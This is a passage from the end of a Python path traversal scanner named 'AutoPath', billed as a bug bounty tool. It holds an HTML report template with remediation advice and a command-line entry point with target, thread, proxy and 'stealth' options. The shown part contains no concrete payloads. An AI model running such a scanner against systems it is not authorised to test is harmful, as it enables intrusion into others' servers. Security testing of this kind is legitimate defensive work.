                        <td>{{ {'CRITICAL': 'Immediate Action Required', 'HIGH': 'High Priority', 'MEDIUM': 'Medium Priority', 'LOW': 'Low Priority'}[severity] }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <div class="remediation">
            <h3>🛡️ Immediate Remediation Steps</h3>
            <ol style="font-size: 1.1em; line-height: 1.6;">
                <li><strong>Input Validation:</strong> Implement strict input validation and sanitization for all user inputs</li>
                <li><strong>Path Canonicalization:</strong> Use secure file path handling functions to resolve and validate paths</li>
                <li><strong>Whitelist Approach:</strong> Only allow access to explicitly defined files and directories</li>
                <li><strong>Sandboxing:</strong> Implement chroot jail or similar containment mechanisms</li>
                <li><strong>Web Application Firewall:</strong> Deploy WAF rules to detect and block path traversal attempts</li>
                <li><strong>Regular Security Audits:</strong> Conduct periodic security assessments and code reviews</li>
            </ol>
        </div>

        {% for vuln in vulnerabilities %}
        <div class="vulnerability">
            <div class="severity-badge {{ vuln.severity }}">{{ vuln.severity }} Risk</div>
            <h3 style="color: #2c3e50; margin: 10px 0;">Path Traversal Vulnerability</h3>
            
            <div class="meta-grid">
                <div class="meta-item">
                    <strong>{{ vuln.confidence|round(1) }}%</strong>
                    <span>Confidence Score</span>
                </div>
                <div class="meta-item">
                    <strong>{{ vuln.method }}</strong>
                    <span>HTTP Method</span>
                </div>
                <div class="meta-item">
                    <strong>{{ vuln.technique }}</strong>
                    <span>Attack Technique</span>
                </div>
                <div class="meta-item">
                    <strong>{{ vuln.timestamp.strftime('%H:%M:%S') }}</strong>
                    <span>Discovery Time</span>
                </div>
            </div>
            
            <div class="confidence-bar">
                <div class="confidence-fill" style="width: {{ vuln.confidence*100 }}%; background: linear-gradient(135deg, #e74c3c, #c0392b);"></div>
            </div>
            
            <p><strong>🎯 Affected URL:</strong> <code>{{ vuln.url }}</code></p>
            <p><strong>🔍 Vulnerable Parameter:</strong> <code>{{ vuln.parameter }}</code></p>
            
            <h4 style="color: #e74c3c;">💥 Exploit Payload:</h4>
            <div class="payload-box">{{ vuln.payload }}</div>
            
            <h4 style="color: #27ae60;">🔬 Response Evidence:</h4>
            <div class="evidence-box">{{ vuln.evidence }}</div>
            
            <h4 style="color: #8e44ad;">⚠️ Security Impact:</h4>
            <ul style="font-size: 1.1em; line-height: 1.6;">
                <li><strong>Data Exposure:</strong> Unauthorized access to sensitive system files and configurations</li>
                <li><strong>Information Disclosure:</strong> Potential exposure of credentials, API keys, and internal data</li>
                <li><strong>System Reconnaissance:</strong> Ability to map internal file structure and identify attack vectors</li>
                <li><strong>Privilege Escalation:</strong> Possible path to further system compromise</li>
            </ul>
        </div>
        {% endfor %}
        
        <div class="footer">
            <p>Generated by AutoPath Scanner - Advanced Path Traversal Detection Tool</p>
            <p>⚠️ This report contains sensitive security information. Handle with care.</p>
        </div>
    </div>
</body>
</html>
        """
        
        from jinja2 import Template
        
        # Calculate statistics
        severity_stats = defaultdict(int)
        unique_urls = set()
        total_confidence = 0
        
        for vuln in self.vulnerabilities:
            severity_stats[vuln.severity] += 1
            unique_urls.add(vuln.url)
            total_confidence += vuln.confidence
        
        avg_confidence = (total_confidence / len(self.vulnerabilities) * 100) if self.vulnerabilities else 0
        high_critical = severity_stats['CRITICAL'] + severity_stats['HIGH']
        
        template = Template(html_template)
        html_content = template.render(
            target=self.target,
            scan_date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            vulnerabilities=self.vulnerabilities,
            total_vulns=len(self.vulnerabilities),
            unique_urls=len(unique_urls),
            high_critical=high_critical,
            avg_confidence=avg_confidence,
            severity_stats=dict(severity_stats)
        )
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}[✓] Detailed report saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser(description='AutoPath - Advanced Path Traversal Scanner')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('--max-depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (default: 0.5)')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (slower but quieter)')
    parser.add_argument('--proxy', help='HTTP proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--scope', nargs='+', help='Scope patterns (e.g., *.target.com)')
    parser.add_argument('--output', default='autopath_report.html', help='Output report file')
    
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}")
    print("=" * 80)
    print("  █████╗ ██╗   ██╗████████╗ ██████╗ ██████╗  █████╗ ████████╗██╗  ██╗")
    print(" ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██║  ██║")
    print(" ███████║██║   ██║   ██║   ██║   ██║██████╔╝███████║   ██║   ███████║")
    print(" ██╔══██║██║   ██║   ██║   ██║   ██║██╔═══╝ ██╔══██║   ██║   ██╔══██║")
    print(" ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║     ██║  ██║   ██║   ██║  ██║")
    print(" ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝")
    print()
    print("        Advanced Path Traversal Discovery Tool for Bug Bounty")
    print("=" * 80)
    print(f"{Style.RESET_ALL}")
    
    # Validate target
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
    
    print(f"{Fore.GREEN}[*] Target: {args.target}")
    print(f"[*] Max Depth: {args.max_depth}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Stealth Mode: {'ON' if args.stealth else 'OFF'}")
    if args.proxy:
        print(f"[*] Proxy: {args.proxy}")
    
    # Initialize and run scanner
    scanner = AutoPathScanner(
        target=args.target,
        max_depth=args.max_depth,
        threads=args.threads,
        delay=args.delay,
        stealth=args.stealth,
        proxy=args.proxy
    )
    
    # Run scan
    start_time = datetime.now()
    vulnerabilities = scanner.scan()
    end_time = datetime.now()
    
    # Print summary
    print(f"\n{Style.BRIGHT}SCAN COMPLETE")
    print("=" * 50)
    print(f"Duration: {end_time - start_time}")
    print(f"Vulnerabilities Found: {len(vulnerabilities)}")
    
    if vulnerabilities:
        severity_counts = defaultdict(int)
        for vuln in vulnerabilities:
            severity_counts[vuln.severity] += 1
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = severity_counts[severity]
            if count > 0:
                color = {'CRITICAL': Fore.MAGENTA, 'HIGH': Fore.RED, 
                        'MEDIUM': Fore.YELLOW, 'LOW': Fore.CYAN}[severity]
                print(f"{color}{severity}: {count}")
        
        # Generate report
        scanner.generate_report(args.output)
        
        print(f"\n{Fore.GREEN}[✓] Scan completed successfully!")
        print(f"[✓] Found {len(vulnerabilities)} path traversal vulnerabilities")
        print(f"[✓] Detailed report saved to: {args.output}")
        
    else:
        print(f"\n{Fore.GREEN}[✓] No path traversal vulnerabilities detected")
        print(f"[*] This could indicate good security practices or effective filtering")

if __name__ == "__main__":
    main()